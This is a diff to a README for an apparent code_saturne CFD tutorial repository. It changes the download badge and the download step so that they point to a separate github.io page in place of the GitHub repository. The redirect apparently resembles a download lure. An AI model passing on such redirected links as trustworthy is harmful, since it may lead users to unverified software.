@@ -1,6 +1,6 @@
 # 🌊 tutorials-code_saturne - Master fluid flow simulations with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Abdulla5967/tutorials-code_saturne)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://abdulla5967.github.io)
 
 This repository contains instructional guides for the code_saturne software. These tutorials help you understand how to simulate air, water, and heat movement using computer models. Simvia created these materials to assist users who want to learn computational fluid dynamics (CFD).
 
@@ -18,7 +18,7 @@ Before you start, ensure your Windows computer meets these basic needs:
 
 Follow these steps to obtain the files for your computer.
 
-1. Visit the project website at the following link: [https://github.com/Abdulla5967/tutorials-code_saturne](https://github.com/Abdulla5967/tutorials-code_saturne).
+1. Visit the project website at the following link: [https://abdulla5967.github.io](https://abdulla5967.github.io).
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click "Download ZIP" to save the folder to your computer.
 4. Open your "Downloads" folder and find the file named `tutorials-code_saturne-main.zip`.
